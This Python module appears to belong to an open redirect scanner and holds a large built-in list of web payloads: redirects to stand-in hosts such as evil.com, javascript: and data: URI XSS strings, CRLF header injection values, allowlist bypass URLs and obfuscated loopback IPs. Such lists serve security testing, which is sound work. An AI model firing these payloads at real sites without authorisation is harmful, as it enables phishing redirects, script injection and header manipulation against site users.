"""
OpenX Payload Manager
Manages payloads for open redirect vulnerability testing
"""

import os
import urllib.parse
from colorama import Fore, Style

class PayloadManager:
    """Manages payloads for open redirect testing"""
    
    def __init__(self, custom_payloads_file=None):
        self.custom_payloads_file = custom_payloads_file
        self.built_in_payloads = self._get_built_in_payloads()
        self.header_payloads = self._get_header_payloads()
        
        # Load custom payloads if provided
        self.custom_payloads = []
        if custom_payloads_file and os.path.exists(custom_payloads_file):
            self.custom_payloads = self._load_custom_payloads(custom_payloads_file)
    
    def _get_built_in_payloads(self):
        """Get comprehensive built-in payload database"""
        payloads = []
        
        # Basic external redirect payloads
        external_domains = [
            'http://evil.com',
            'https://evil.com',
            'http://attacker.com',
            'https://attacker.com',
            'http://google.com',
            'https://google.com',
            'http://example.com',
            'https://example.com'
        ]
        payloads.extend(external_domains)
        
        # Protocol confusion payloads
        protocol_payloads = [
            '//evil.com',
            '///evil.com',
            '\\\\evil.com',
            'http:/evil.com',
            'https:/evil.com',
            'javascript:alert(1)',
            'data:text/html,<script>alert(1)</script>',
            'ftp://evil.com'
        ]
        payloads.extend(protocol_payloads)
        
        # URL encoding variations
        encoded_payloads = [
            urllib.parse.quote('http://evil.com'),
            urllib.parse.quote('//evil.com'),
            urllib.parse.quote_plus('http://evil.com'),
            'http%3A%2F%2Fevil.com',
            'http%3a%2f%2fevil.com',
            '%68%74%74%70%3a%2f%2f%65%76%69%6c%2e%63%6f%6d',  # Full hex encoding
        ]
        payloads.extend(encoded_payloads)
        
        # Double encoding
        double_encoded = [
            urllib.parse.quote(urllib.parse.quote('http://evil.com')),
            urllib.parse.quote(urllib.parse.quote('//evil.com'))
        ]
        payloads.extend(double_encoded)
        
        # Unicode encoding
        unicode_payloads = [
            'http://evil.com'.encode('utf-8').decode('unicode_escape'),
            '//evil.com'.encode('utf-8').decode('unicode_escape')
        ]
        payloads.extend(unicode_payloads)
        
        # CRLF injection payloads
        crlf_payloads = [
            'http://evil.com%0d%0aLocation:http://attacker.com',
            'http://evil.com%0aLocation:http://attacker.com',
            'http://evil.com%0d%0a%0d%0a<script>alert(1)</script>',
            'http://evil.com\r\nLocation:http://attacker.com'
        ]
        payloads.extend(crlf_payloads)
        
        # Bypass payloads
        bypass_payloads = [
            'http://evil.com#.example.com',
            'http://evil.com?.example.com',
            'http://evil.com/.example.com',
            'http://example.com@evil.com',
            'http://example.com:80@evil.com',
            'http://evil.com/?.example.com',
            'http://evil.com#?.example.com'
        ]
        payloads.extend(bypass_payloads)
        
        # IP address variations
        ip_payloads = [
            'http://192.168.1.1',
            'http://127.0.0.1',
            'http://0x7f.0x0.0x0.0x1',  # Hex IP
            'http://2130706433',  # Decimal IP for 127.0.0.1
            'http://017700000001',  # Octal IP for 127.0.0.1
        ]
        payloads.extend(ip_payloads)
        
        # Data URI payloads
        data_payloads = [
            'data:text/html,<h1>XSS</h1>',
            'data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==',
            'data:text/html,<script>window.location="http://evil.com"</script>'
        ]
        payloads.extend(data_payloads)
        
        # Whitespace and null byte payloads
        whitespace_payloads = [
            'http://evil.com%20',
            'http://evil.com%09',
            'http://evil.com%0a',
            'http://evil.com%00',
            ' http://evil.com',
            '\thttp://evil.com',
            'http://evil.com\x00'
        ]
        payloads.extend(whitespace_payloads)
        
        return payloads
    
    def _get_header_payloads(self):
        """Get payloads specifically for header injection testing"""
        return [
            'evil.com',
            'attacker.com',
            'example.com:8080',
            'evil.com:443',
            'http://evil.com',
            'https://evil.com',
            '//evil.com',
            'evil.com/path',
            'subdomain.evil.com'
        ]
    
    def _load_custom_payloads(self, file_path):
        """Load custom payloads from file"""
        try:
            with open(file_path, 'r', encoding='utf-8') as f:
                payloads = [line.strip() for line in f if line.strip() and not line.startswith('#')]
            print(f"{Fore.GREEN}[INFO] Loaded {len(payloads)} custom payloads from {file_path}{Style.RESET_ALL}")
            return payloads
        except Exception as e:
            print(f"{Fore.YELLOW}[WARNING] Failed to load custom payloads from {file_path}: {str(e)}{Style.RESET_ALL}")
            return []
    
    def get_payloads(self):
        """Get all payloads (built-in + custom)"""
        all_payloads = self.built_in_payloads.copy()
        if self.custom_payloads:
            all_payloads.extend(self.custom_payloads)
        return all_payloads
    
    def get_header_payloads(self):
        """Get payloads for header injection testing"""
        return self.header_payloads
    
    def get_encoded_variations(self, payload):
        """Get various encoded variations of a payload"""
        variations = [payload]
        
        # URL encoding
        variations.append(urllib.parse.quote(payload))
        variations.append(urllib.parse.quote_plus(payload))
        
        # Double URL encoding
        variations.append(urllib.parse.quote(urllib.parse.quote(payload)))
        
        # HTML encoding
        html_encoded = payload.replace('&', '&amp;').replace('<', '&lt;').replace('>', '&gt;')
        variations.append(html_encoded)
        
        return variations
